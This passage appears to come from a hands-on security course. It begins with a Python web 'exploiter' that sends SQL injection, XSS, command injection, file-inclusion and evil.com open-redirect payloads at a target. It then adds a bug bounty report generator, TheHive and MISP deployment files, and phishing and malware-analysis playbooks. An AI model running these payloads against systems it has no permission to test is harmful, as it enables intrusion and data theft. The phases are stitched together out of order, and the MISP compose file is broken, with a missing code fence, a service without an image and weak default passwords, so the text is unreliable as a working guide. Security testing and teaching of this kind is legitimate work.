**Step 3.2: Web Exploitation Toolkit**

```python
# File: exploit/web_exploiter.py
"""
Web application exploitation automation
"""

import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess

class WebExploiter:
    """Automated web application exploitation"""
    
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_sql_injection(self, params):
        """Test for SQL injection vulnerabilities"""
        
        print("[*] Testing SQL injection...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        vulnerable_params = []
        
        for param, value in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(self.target, params=test_params)
                    
                    # Check for SQL errors
                    sql_errors = [
                        "SQL syntax",
                        "mysql_fetch",
                        "ORA-",
                        "PostgreSQL",
                        "SQLite",
                        "Microsoft SQL",
                        "ODBC SQL"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vuln = {
                                'type': 'SQL Injection',
                                'param': param,
                                'payload': payload,
                                'severity': 'CRITICAL',
                                'evidence': error
                            }
                            vulnerable_params.append(vuln)
                            print(f"  [!] SQLi found in parameter: {param}")
                            break
                
                except Exception as e:
                    continue
        
        self.vulnerabilities.extend(vulnerable_params)
        return vulnerable_params
    
    def test_xss(self, params):
        """Test for Cross-Site Scripting vulnerabilities"""
        
        print("[*] Testing XSS...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        vulnerable_params = []
        
        for param, value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(self.target, params=test_params)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'param': param,
                            'payload': payload,
                            'severity': 'HIGH',
                            'reflected': True
                        }
                        vulnerable_params.append(vuln)
                        print(f"  [!] XSS found in parameter: {param}")
                        break
                
                except Exception as e:
                    continue
        
        self.vulnerabilities.extend(vulnerable_params)
        return vulnerable_params
    
    def test_command_injection(self, params):
        """Test for command injection vulnerabilities"""
        
        print("[*] Testing command injection...")
        
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "& net user"
        ]
        
        vulnerable_params = []
        
        for param, value in params.items():
            for payload in cmd_payloads:
                test_params = params.copy()
                test_params[param] = value + payload
                
                try:
                    response = self.session.get(self.target, params=test_params)
                    
                    # Check for command output indicators
                    cmd_indicators = [
                        "root:",
                        "bin:",
                        "drwxr",
                        "total",
                        "uid=",
                        "Administrator"
                    ]
                    
                    for indicator in cmd_indicators:
                        if indicator in response.text:
                            vuln = {
                                'type': 'Command Injection',
                                'param': param,
                                'payload': payload,
                                'severity': 'CRITICAL',
                                'evidence': indicator
                            }
                            vulnerable_params.append(vuln)
                            print(f"  [!] Command injection found in parameter: {param}")
                            break
                
                except Exception as e:
                    continue
        
        self.vulnerabilities.extend(vulnerable_params)
        return vulnerable_params
    
    def test_lfi(self, params):
        """Test for Local File Inclusion"""
        
        print("[*] Testing LFI...")
        
        lfi_payloads = [
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        vulnerable_params = []
        
        for param, value in params.items():
            for payload in lfi_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    response = self.session.get(self.target, params=test_params)
                    
                    # Check for file content
                    if "root:" in response.text or "[drivers]" in response.text:
                        vuln = {
                            'type': 'Local File Inclusion (LFI)',
                            'param': param,
                            'payload': payload,
                            'severity': 'HIGH',
                            'file_accessed': 'passwd' if 'root:' in response.text else 'hosts'
                        }
                        vulnerable_params.append(vuln)
                        print(f"  [!] LFI found in parameter: {param}")
                        break
                
                except Exception as e:
                    continue
        
        self.vulnerabilities.extend(vulnerable_params)
        return vulnerable_params
    
    def test_idor(self):
        """Test for Insecure Direct Object References"""
        
        print("[*] Testing IDOR...")
        
        # This is context-specific, example implementation
        id_params = ['id', 'user_id', 'account_id', 'uid', 'user']
        
        vulnerable = []
        
        for param in id_params:
            # Try accessing different IDs
            for test_id in range(1, 10):
                params = {param: str(test_id)}
                
                try:
                    response = self.session.get(self.target, params=params)
                    
                    # Check if we can access other users' data
                    # This is simplified - real testing would need context
                    if response.status_code == 200 and len(response.text) > 1000:
                        vuln = {
                            'type': 'Insecure Direct Object Reference (IDOR)',
                            'param': param,
                            'tested_value': test_id,
                            'severity': 'HIGH'
                        }
                        vulnerable.append(vuln)
                        print(f"  [!] Potential IDOR in parameter: {param}")
                        break
                
                except Exception as e:
                    continue
        
        self.vulnerabilities.extend(vulnerable)
        return vulnerable
    
    def test_open_redirect(self, params):
        """Test for open redirect vulnerabilities"""
        
        print("[*] Testing open redirects...")
        
        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "https://evil.com",
            "javascript:alert('XSS')"
        ]
        
        redirect_params = ['url', 'redirect', 'next', 'goto', 'return', 'redir']
        
        vulnerable = []
        
        for param in redirect_params:
            if param in params or True:  # Test common params
                for payload in redirect_payloads:
                    test_params = {param: payload}
                    
                    try:
                        response = self.session.get(
                            self.target,
                            params=test_params,
                            allow_redirects=False
                        )
                        
                        # Check if redirect points to our payload
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location or payload in location:
                                vuln = {
                                    'type': 'Open Redirect',
                                    'param': param,
                                    'payload': payload,
                                    'severity': 'MEDIUM',
                                    'redirect_to': location
                                }
                                vulnerable.append(vuln)
                                print(f"  [!] Open redirect found in parameter: {param}")
                                break
                    
                    except Exception as e:
                        continue
        
        self.vulnerabilities.extend(vulnerable)
        return vulnerable

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python web_exploiter.py <url>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    exploiter = WebExploiter(target)
    
    # Example parameters (would be discovered during recon)
    test_params = {
        'id': '1',
        'page': 'home',
        'user': 'admin'
    }
    
    # Run all tests
    exploiter.test_sql_injection(test_params)
    exploiter.test_xss(test_params)
    exploiter.test_command_injection(test_params)
    exploiter.test_lfi(test_params)
    exploiter.test_idor()
    exploiter.test_open_redirect(test_params)
    
    # Print summary
    print(f"\n[+] Total vulnerabilities found: {len(exploiter.vulnerabilities)}")
    
    critical = [v for v in exploiter.vulnerabilities if v['severity'] == 'CRITICAL']
    high = [v for v in exploiter.vulnerabilities if v['severity'] == 'HIGH']
    medium = [v for v in exploiter.vulnerabilities if v['severity'] == 'MEDIUM']
    
    print(f"  Critical: {len(critical)}")
    print(f"  High: {len(high)}")
    print(f"  Medium: {len(medium)}")
```

### Phase 4: Professional Reporting System (2 hours)

**Step 4.1: Bug Bounty Report Generator**

```python
# File: reporting/bug_bounty_report.py
"""
Professional bug bounty report generation
"""

from datetime import datetime
import json
import markdown
from jinja2 import Template

class BugBountyReport:
    """Generate professional bug bounty reports"""
    
    def __init__(self, vulnerability):
        self.vuln = vulnerability
        self.report_id = f"BB-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    
    def calculate_cvss(self):
        """Calculate CVSS score"""
        
        # Simplified CVSS calculation
        base_scores = {
            'SQL Injection': 9.0,
            'Command Injection': 9.5,
            'XSS': 7.0,
            'LFI': 8.0,
            'IDOR': 7.5,
            'Open Redirect': 5.0
        }
        
        return base_scores.get(self.vuln.get('type'), 5.0)
    
    def determine_severity(self, cvss):
        """Determine severity based on CVSS"""
        
        if cvss >= 9.0:
            return 'CRITICAL'
        elif cvss >= 7.0:
            return 'HIGH'
        elif cvss >= 4.0:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def generate_markdown_report(self):
        """Generate Markdown report"""
        
        cvss = self.calculate_cvss()
        severity = self.determine_severity(cvss)
        
        template = Template('''
# Bug Bounty Report: {{ vuln_type }}

**Report ID:** {{ report_id }}  
**Date:** {{ date }}  
**Severity:** {{ severity }}  
**CVSS Score:** {{ cvss }}

---

## Summary

A {{ vuln_type }} vulnerability has been identified in the target application.

## Vulnerability Details

**Type:** {{ vuln_type }}  
**Location:** {{ location }}  
**Parameter:** {{ parameter }}  
**Severity:** {{ severity }}

## Description

{{ description }}

## Steps to Reproduce

1. Navigate to: {{ location }}
2. Inject the following payload in the `{{ parameter }}` parameter:
   ```
   {{ payload }}
   ```
3. Observe the application behavior

## Proof of Concept

**Request:**
```http
GET {{ location }}?{{ parameter }}={{ payload }} HTTP/1.1
Host: {{ host }}
```

**Response Evidence:**
```
{{ evidence }}
```

## Impact

{{ impact }}

### Business Impact:
- {{ business_impact }}

### Technical Impact:
- {{ technical_impact }}

## CVSS v3.1 Vector

**Vector String:** {{ cvss_vector }}  
**Score:** {{ cvss }} ({{ severity }})

## Remediation

### Immediate Steps:
{{ immediate_remediation }}

### Long-term Fix:
{{ longterm_remediation }}

### Code Example (Secure Implementation):
```{{ code_lang }}
{{ secure_code }}
```

## References

- [OWASP - {{ vuln_type }}](https://owasp.org)
- [CWE Entry](https://cwe.mitre.org)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)

## Affected Assets

- **Application:** {{ app_name }}
- **URL:** {{ location }}
- **Parameter:** {{ parameter }}

## Timeline

- **Discovered:** {{ date }}
- **Reported:** {{ date }}
- **Severity:** {{ severity }}

---

**Researcher:** [Your Name]  
**Contact:** [Your Email]  
**PGP Key:** [Your PGP Key ID]
''')
        
        # Get remediation advice
        remediation = self.get_remediation_advice()
        impact = self.get_impact_description()
        
        report = template.render(
            vuln_type=self.vuln.get('type', 'Unknown'),
            report_id=self.report_id,
            date=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            severity=severity,
            cvss=cvss,
            location=self.vuln.get('url', 'N/A'),
            parameter=self.vuln.get('param', 'N/A'),
            payload=self.vuln.get('payload', 'N/A'),
            evidence=self.vuln.get('evidence', 'See screenshots'),
            host=self.vuln.get('host', 'target.com'),
            description=impact['description'],
            impact=impact['impact'],
            business_impact=impact['business_impact'],
            technical_impact=impact['technical_impact'],
            cvss_vector=self.get_cvss_vector(),
            immediate_remediation=remediation['immediate'],
            longterm_remediation=remediation['longterm'],
            secure_code=remediation['code'],
            code_lang=remediation['lang'],
            app_name=self.vuln.get('app_name', 'Target Application')
        )
        
        return report
    
    def get_remediation_advice(self):
        """Get remediation recommendations"""
        
        remediation_db = {
            'SQL Injection': {
                'immediate': '1. Disable the vulnerable endpoint\n2. Apply input validation\n3. Use prepared statements',
                'longterm': 'Implement parameterized queries throughout the application and conduct a comprehensive code review.',
                'code': '''// Use prepared statements
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();''',
                'lang': 'java'
            },
            'Cross-Site Scripting (XSS)': {
                'immediate': '1. Apply output encoding\n2. Implement Content Security Policy\n3. Enable XSS filters',
                'longterm': 'Implement context-aware output encoding and use a modern framework with auto-escaping.',
                'code': '''// Encode output
String safe = StringEscapeUtils.escapeHtml4(userInput);
out.println(safe);''',
                'lang': 'java'
            },
            'Command Injection': {
                'immediate': '1. Disable command execution\n2. Validate and sanitize all inputs\n3. Use allowlists',
                'longterm': 'Avoid system command execution. Use language-specific libraries instead.',
                'code': '''// Use safe alternatives
Path userFile = Paths.get(safeDirectory, filename);
// Validate path is within safe directory
if (!userFile.normalize().startsWith(safeDirectory)) {
    throw new SecurityException("Invalid file path");
}''',
                'lang': 'java'
            }
        }
        
        vuln_type = self.vuln.get('type', 'Unknown')
        return remediation_db.get(
            vuln_type,
            {
                'immediate': 'Apply input validation',
                'longterm': 'Conduct security code review',
                'code': '// Implement secure coding practices',
                'lang': 'text'
            }
        )
    
    def get_impact_description(self):
        """Get impact description"""
        
        impact_db = {
            'SQL Injection': {
                'description': 'SQL Injection allows attackers to interfere with database queries.',
                'impact': 'An attacker can read, modify, or delete sensitive data from the database.',
                'business_impact': 'Data breach, loss of customer trust, regulatory fines (GDPR, etc.)',
                'technical_impact': 'Full database compromise, ability to execute OS commands on database server'
            },
            'Cross-Site Scripting (XSS)': {
                'description': 'XSS allows injection of malicious scripts into web pages.',
                'impact': 'Attackers can steal session cookies, deface websites, or redirect users.',
                'business_impact': 'Account takeover, reputation damage, loss of user trust',
                'technical_impact': 'Session hijacking, credential theft, malware distribution'
            },
            'Command Injection': {
                'description': 'Command Injection allows execution of arbitrary system commands.',
                'impact': 'Complete server compromise with ability to execute any command.',
                'business_impact': 'Complete system compromise, data theft, service disruption',
                'technical_impact': 'Remote code execution, privilege escalation, data exfiltration'
            }
        }
        
        vuln_type = self.vuln.get('type', 'Unknown')
        return impact_db.get(
            vuln_type,
            {
                'description': 'Security vulnerability identified.',
                'impact': 'Potential security risk.',
                'business_impact': 'Business operations may be affected.',
                'technical_impact': 'System security may be compromised.'
            }
        )
    
    def get_cvss_vector(self):
        """Generate CVSS vector string"""
        
        vectors = {
            'SQL Injection': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
            'XSS': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
            'Command Injection': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
        }
        
        return vectors.get(self.vuln.get('type'), 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N')
    
    def save_report(self, filename=None):
        """Save report to file"""
        
        if not filename:
            filename = f"{self.report_id}.md"
        
        report = self.generate_markdown_report()
        
        with open(filename, 'w') as f:
            f.write(report)
        
        # Also save as JSON for database
        json_filename = filename.replace('.md', '.json')
        with open(json_filename, 'w') as f:
            json.dump({
                'report_id': self.report_id,
                'vulnerability': self.vuln,
                'cvss': self.calculate_cvss(),
                'severity': self.determine_severity(self.calculate_cvss()),
                'timestamp': datetime.now().isoformat()
            }, f, indent=2)
        
        print(f"[+] Report saved: {filename}")
        print(f"[+] JSON saved: {json_filename}")
        
        return filename

# Usage
if __name__ == "__main__":
    # Example vulnerability
    vuln = {
        'type': 'SQL Injection',
        'url': 'https://target.com/search',
        'param': 'query',
        'payload': "' OR '1'='1",
        'evidence': 'SQL syntax error',
        'host': 'target.com',
        'app_name': 'Search Application'
    }
    
    report = BugBountyReport(vuln)
    report.save_report()
```

### Phase 1: Platform Deployment (3-4 hours)

**Step 1.1: Deploy TheHive**

```yaml
# File: docker-compose-thehive.yml
version: '3.8'

services:
  elasticsearch:
    image: elasticsearch:7.17.9
    container_name: thehive-elasticsearch
    environment:
      - discovery.type=single-node
      - cluster.name=hive
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms2g -Xmx2g"
    ulimits:
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data
    networks:
      - incident-response
    restart: unless-stopped

  cassandra:
    image: cassandra:4.0
    container_name: thehive-cassandra
    environment:
      - MAX_HEAP_SIZE=1G
      - HEAP_NEWSIZE=400M
      - CASSANDRA_CLUSTER_NAME=thehive
    volumes:
      - cassandra-data:/var/lib/cassandra
    networks:
      - incident-response
    restart: unless-stopped

  thehive:
    image: thehiveproject/thehive4:latest
    container_name: thehive
    depends_on:
      - elasticsearch
      - cassandra
    ports:
      - "9000:9000"
    environment:
      - TH_SECRET=${TH_SECRET:-supersecretkey}
    command:
      - --secret
      - ${TH_SECRET:-supersecretkey}
      - --cql-hostnames
      - cassandra
      - --index-backend
      - elasticsearch
      - --es-hostnames
      - elasticsearch
      - --cortex-hostnames
      - cortex
      - --cortex-ports
      - 9001
    volumes:
      - thehive-data:/opt/thp/thehive/data
      - thehive-files:/opt/thp/thehive/files
    networks:
      - incident-response
    restart: unless-stopped

  cortex:
    image: thehiveproject/cortex:latest
    container_name: cortex
    depends_on:
      - elasticsearch
    ports:
      - "9001:9001"
    environment:
      - job_directory=/tmp/cortex-jobs
    volumes:
      - cortex-jobs:/tmp/cortex-jobs
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
      - incident-response
    restart: unless-stopped

volumes:
  elasticsearch-data:
  cassandra-data:
  thehive-data:
  thehive-files:
  cortex-jobs:

networks:
  incident-response:
    driver: bridge
```

```bash
# File: deploy-thehive.sh
#!/bin/bash

set -e

echo "Deploying TheHive Incident Response Platform..."

# Generate secret key
export TH_SECRET=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)

# Create directories
mkdir -p data/{elasticsearch,cassandra,thehive,cortex}

# Start services
docker-compose -f docker-compose-thehive.yml up -d

echo "Waiting for services to start..."
sleep 60

# Check service health
echo "Checking service health..."
curl -s http://localhost:9000/api/status | jq .
curl -s http://localhost:9001/api/status | jq .

echo ""
echo "✓ TheHive deployed successfully!"
echo ""
echo "Access URLs:"
echo "  TheHive: http://localhost:9000"
echo "  Cortex:  http://localhost:9001"
echo ""
echo "Default credentials:"
echo "  Username: admin@thehive.local"
echo "  Password: secret"
echo ""
echo "⚠️  IMPORTANT: Change default password immediately!"
echo ""
echo "Secret key (save this): $TH_SECRET"
```

# File: docker-compose-misp.yml
version: '3.8'

services:
  redis:

    container_name: misp-redis
    networks:
      - incident-response
    restart: unless-stopped

  db:
    image: mysql:8.0
    container_name: misp-db
    environment:
      - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD:-misppass}
      - MYSQL_DATABASE=misp
      - MYSQL_USER=misp
      - MYSQL_PASSWORD=${MYSQL_PASSWORD:-misppass}
    volumes:
      - mysql-data:/var/lib/mysql
    networks:
      - incident-response
    restart: unless-stopped

  misp:
    image: coolacid/misp-docker:core-latest
    container_name: misp
    depends_on:
      - redis
      - db
    ports:
      - "443:443"
      - "80:80"
    environment:
      - MYSQL_HOST=db
      - MYSQL_DATABASE=misp
      - MYSQL_USER=misp
      - MYSQL_PASSWORD=${MYSQL_PASSWORD:-misppass}
      - REDIS_FQDN=redis
      - HOSTNAME=https://localhost
      - MISP_ADMIN_EMAIL=admin@localhost
      - MISP_ADMIN_PASSPHRASE=${MISP_ADMIN_PASS:-admin}
      - MISP_BASEURL=https://localhost
    volumes:
      - misp-data:/var/www/MISP
    networks:
      - incident-response
    restart: unless-stopped

  misp-modules:
    image: coolacid/misp-docker:modules-latest
    container_name: misp-modules
    depends_on:
      - misp
    environment:
      - REDIS_FQDN=redis
    networks:
      - incident-response
    restart: unless-stopped

volumes:
  mysql-data:
  misp-data:

networks:
  incident-response:
    external: true
```

```bash
# File: deploy-misp.sh
#!/bin/bash

set -e

echo "Deploying MISP Threat Intelligence Platform..."

# Generate passwords
export MYSQL_ROOT_PASSWORD=$(openssl rand -base64 32)
export MYSQL_PASSWORD=$(openssl rand -base64 32)
export MISP_ADMIN_PASS=$(openssl rand -base64 16)

# Save credentials
cat > misp-credentials.txt << EOF
MISP Credentials:
MySQL Root Password: $MYSQL_ROOT_PASSWORD
MySQL MISP Password: $MYSQL_PASSWORD
MISP Admin Password: $MISP_ADMIN_PASS
EOF

chmod 600 misp-credentials.txt

# Start services
docker-compose -f docker-compose-misp.yml up -d

echo "Waiting for MISP to initialize..."
sleep 120

echo ""
echo "✓ MISP deployed successfully!"
echo ""
echo "Access URL: https://localhost"
echo "Username: admin@localhost"
echo "Password: (see misp-credentials.txt)"
echo ""
echo "⚠️  Credentials saved to: misp-credentials.txt"

### Phase 2: Automated Playbooks (3-4 hours)

**Step 2.1: Phishing Response Playbook**

```python
# File: playbooks/phishing_response.py
"""
Automated phishing incident response playbook
"""

import requests
import json
from datetime import datetime
import email
from email import policy
from email.parser import BytesParser
import hashlib
import re

class PhishingPlaybook:
    """Automated phishing response"""
    
    def __init__(self, thehive_url, thehive_api_key, cortex_url, cortex_api_key):
        self.thehive_url = thehive_url
        self.thehive_key = thehive_api_key
        self.cortex_url = cortex_url
        self.cortex_key = cortex_api_key
        
        self.headers_hive = {
            'Authorization': f'Bearer {thehive_api_key}',
            'Content-Type': 'application/json'
        }
        
        self.headers_cortex = {
            'Authorization': f'Bearer {cortex_api_key}',
            'Content-Type': 'application/json'
        }
    
    def create_case(self, email_data):
        """Create TheHive case for phishing email"""
        
        case = {
            'title': f'Phishing: {email_data["subject"]}',
            'description': f'''
# Phishing Email Report

**From:** {email_data["from"]}
**To:** {email_data["to"]}
**Subject:** {email_data["subject"]}
**Date:** {email_data["date"]}

## Initial Analysis

This case was automatically created for a reported phishing email.

## Next Steps

1. Analyze email headers
2. Extract and analyze URLs
3. Extract and analyze attachments
4. Check sender reputation
5. Search for similar emails
6. Determine response actions
''',
            'severity': 2,  # Medium
            'tlp': 2,  # AMBER
            'pap': 2,  # AMBER
            'tags': ['phishing', 'email', 'automated'],
            'tasks': [
                {
                    'title': 'Analyze Email Headers',
                    'description': 'Review email headers for spoofing indicators'
                },
                {
                    'title': 'Analyze URLs',
                    'description': 'Extract and analyze all URLs in email body'
                },
                {
                    'title': 'Analyze Attachments',
                    'description': 'Scan attachments for malware'
                },
                {
                    'title': 'Check Sender Reputation',
                    'description': 'Verify sender domain and IP reputation'
                },
                {
                    'title': 'Search Mailboxes',
                    'description': 'Search for similar emails across organization'
                },
                {
                    'title': 'User Notification',
                    'description': 'Notify affected users'
                },
                {
                    'title': 'Email Purge',
                    'description': 'Remove email from all mailboxes'
                },
                {
                    'title': 'Update Defenses',
                    'description': 'Update email filters and blocklists'
                }
            ]
        }
        
        response = requests.post(
            f'{self.thehive_url}/api/case',
            headers=self.headers_hive,
            json=case
        )
        
        if response.status_code == 201:
            case_id = response.json()['id']
            print(f"✓ Case created: {case_id}")
            return case_id
        else:
            print(f"✗ Error creating case: {response.text}")
            return None
    
    def add_observables(self, case_id, email_data):
        """Add observables to case"""
        
        observables = []
        
        # Add sender email
        observables.append({
            'dataType': 'mail',
            'data': email_data['from'],
            'message': 'Sender email address',
            'tlp': 2,
            'tags': ['sender']
        })
        
        # Add sender IP
        if 'sender_ip' in email_data:
            observables.append({
                'dataType': 'ip',
                'data': email_data['sender_ip'],
                'message': 'Sender IP address',
                'tlp': 2,
                'tags': ['sender', 'ip']
            })
        
        # Add URLs
        urls = self.extract_urls(email_data['body'])
        for url in urls:
            observables.append({
                'dataType': 'url',
                'data': url,
                'message': 'URL from email body',
                'tlp': 2,
                'tags': ['url', 'extracted']
            })
        
        # Add attachment hashes
        for attachment in email_data.get('attachments', []):
            observables.append({
                'dataType': 'hash',
                'data': attachment['hash'],
                'message': f'Attachment: {attachment["filename"]}',
                'tlp': 2,
                'tags': ['attachment', 'hash']
            })
        
        # Add observables to case
        for observable in observables:
            response = requests.post(
                f'{self.thehive_url}/api/case/{case_id}/artifact',
                headers=self.headers_hive,
                json=observable
            )
            
            if response.status_code == 201:
                print(f"✓ Added observable: {observable['data']}")
            else:
                print(f"✗ Error adding observable: {response.text}")
        
        return len(observables)
    
    def analyze_observables(self, case_id):
        """Run Cortex analyzers on observables"""
        
        # Get case observables
        response = requests.get(
            f'{self.thehive_url}/api/case/{case_id}/artifact',
            headers=self.headers_hive
        )
        
        if response.status_code != 200:
            print(f"✗ Error getting observables: {response.text}")
            return
        
        observables = response.json()
        
        # Define analyzers for each data type
        analyzers = {
            'mail': ['EmailRep_1_0'],
            'ip': ['AbuseIPDB_1_0', 'Shodan_Host_1_0', 'VirusTotal_GetReport_3_0'],
            'url': ['VirusTotal_GetReport_3_0', 'URLhaus_2_0', 'GoogleSafeBrowsing_2_0'],
            'hash': ['VirusTotal_GetReport_3_0', 'MalwareBazaar_2_0']
        }
        
        for observable in observables:
            data_type = observable['dataType']
            observable_id = observable['id']
            
            if data_type in analyzers:
                for analyzer in analyzers[data_type]:
                    # Run analyzer
                    job = {
                        'artifactId': observable_id,
                        'analyzerId': analyzer
                    }
                    
                    response = requests.post(
                        f'{self.cortex_url}/api/analyzer/{analyzer}/run',
                        headers=self.headers_cortex,
                        json=job
                    )
                    
                    if response.status_code == 200:
                        job_id = response.json()['id']
                        print(f"✓ Started analysis: {analyzer} on {observable['data']}")
                    else:
                        print(f"✗ Error running analyzer: {response.text}")
    
    def extract_urls(self, text):
        """Extract URLs from text"""
        
        url_pattern = re.compile(
            r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'
        )
        
        return url_pattern.findall(text)
    
    def parse_email(self, email_file):
        """Parse email file and extract data"""
        
        with open(email_file, 'rb') as f:
            msg = BytesParser(policy=policy.default).parse(f)
        
        email_data = {
            'from': msg['from'],
            'to': msg['to'],
            'subject': msg['subject'],
            'date': msg['date'],
            'message_id': msg['message-id'],
            'body': '',
            'attachments': []
        }
        
        # Extract body
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == 'text/plain':
                    email_data['body'] += part.get_content()
        else:
            email_data['body'] = msg.get_content()
        
        # Extract sender IP from headers
        received = msg.get_all('received', [])
        if received:
            # Parse first Received header for sender IP
            ip_match = re.search(r'\[(\d+\.\d+\.\d+\.\d+)\]', received[0])
            if ip_match:
                email_data['sender_ip'] = ip_match.group(1)
        
        # Extract attachments
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_disposition() == 'attachment':
                    filename = part.get_filename()
                    content = part.get_content()
                    
                    # Calculate hash
                    file_hash = hashlib.sha256(content.encode()).hexdigest()
                    
                    email_data['attachments'].append({
                        'filename': filename,
                        'hash': file_hash,
                        'size': len(content)
                    })
        
        return email_data
    
    def execute(self, email_file):
        """Execute complete phishing response playbook"""
        
        print("[*] Starting phishing response playbook...")
        
        # Parse email
        print("[1/4] Parsing email...")
        email_data = self.parse_email(email_file)
        
        # Create case
        print("[2/4] Creating case...")
        case_id = self.create_case(email_data)
        
        if not case_id:
            print("✗ Failed to create case")
            return
        
        # Add observables
        print("[3/4] Adding observables...")
        num_observables = self.add_observables(case_id, email_data)
        print(f"✓ Added {num_observables} observables")
        
        # Analyze observables
        print("[4/4] Running analysis...")
        self.analyze_observables(case_id)
        
        print("")
        print("✓ Phishing response playbook complete!")
        print(f"  Case ID: {case_id}")
        print(f"  Case URL: {self.thehive_url}/index.html#!/case/{case_id}/details")

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python phishing_response.py <email_file>")
        sys.exit(1)
    
    playbook = PhishingPlaybook(
        thehive_url='http://localhost:9000',
        thehive_api_key='YOUR_API_KEY',
        cortex_url='http://localhost:9001',
        cortex_api_key='YOUR_API_KEY'
    )
    
    playbook.execute(sys.argv[1])
```

**Step 2.2: Malware Analysis Playbook**

```python
# File: playbooks/malware_analysis.py
"""
Automated malware analysis playbook
"""

import requests
import hashlib
import os
import subprocess

class MalwarePlaybook:
    """Automated malware analysis and response"""
    
    def __init__(self, thehive_url, thehive_api_key):
        self.thehive_url = thehive_url
        self.thehive_key = thehive_api_key
        
        self.headers = {
            'Authorization': f'Bearer {thehive_api_key}',
            'Content-Type': 'application/json'
        }
    
    def create_case(self, file_info):
        """Create case for malware analysis"""
        
        case = {
            'title': f'Malware Analysis: {file_info["filename"]}',
            'description': f'''
# Malware Analysis Case

**Filename:** {file_info["filename"]}
**MD5:** {file_info["md5"]}
**SHA256:** {file_info["sha256"]}
**Size:** {file_info["size"]} bytes

## Analysis Plan

1. Static analysis
2. Dynamic analysis (sandbox)
3. YARA rule matching
4. IOC extraction
5. Threat intelligence correlation
6. Containment actions
''',
            'severity': 3,  # High
            'tlp': 2,
            'tags': ['malware', 'analysis'],
            'tasks': [
                {
                    'title': 'Static Analysis',
                    'description': 'PE analysis, strings extraction, etc.'
                },
                {
                    'title': 'Dynamic Analysis',
                    'description': 'Execute in sandbox environment'
                },
                {
                    'title': 'YARA Scanning',
                    'description': 'Scan with YARA rules'
                },
                {
                    'title': 'IOC Extraction',
                    'description': 'Extract IPs, domains, file hashes'
                },
                {
                    'title': 'TI Correlation',
                    'description': 'Check against threat intelligence'
                },
                {
                    'title': 'Containment',
                    'description': 'Block IOCs, isolate systems'
                },
                {
                    'title': 'Eradication',
                    'description': 'Remove malware from systems'
                },
                {
                    'title': 'Recovery',
                    'description': 'Restore affected systems'
                }
            ]
        }
        
        response = requests.post(
            f'{self.thehive_url}/api/case',
            headers=self.headers,
            json=case
        )
        
        if response.status_code == 201:
            return response.json()['id']
        return None
    
    def static_analysis(self, file_path):
        """Perform static analysis on file"""
        
        analysis = {
            'strings': [],
            'pe_info': {},
            'entropy': 0
        }
        
        # Extract strings
        try:
            result = subprocess.run(
                ['strings', '-n', '10', file_path],
                capture_output=True,
                text=True,
                timeout=30
            )
            analysis['strings'] = result.stdout.split('\n')[:100]  # First 100 strings
        except Exception as e:
            print(f"⚠ String extraction failed: {e}")
        
        # PE analysis (if Windows executable)
        try:
            import pefile
            pe = pefile.PE(file_path)
            analysis['pe_info'] = {
                'imports': [imp.name.decode() for imp in pe.DIRECTORY_ENTRY_IMPORT[:10]],
                'sections': [sec.Name.decode().strip('\x00') for sec in pe.sections],
                'timestamp': pe.FILE_HEADER.TimeDateStamp
            }
        except:
            pass
        
        # Calculate entropy
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                if data:
                    import math
                    from collections import Counter
                    counter = Counter(data)
                    length = len(data)
                    entropy = -sum(
                        count/length * math.log2(count/length)
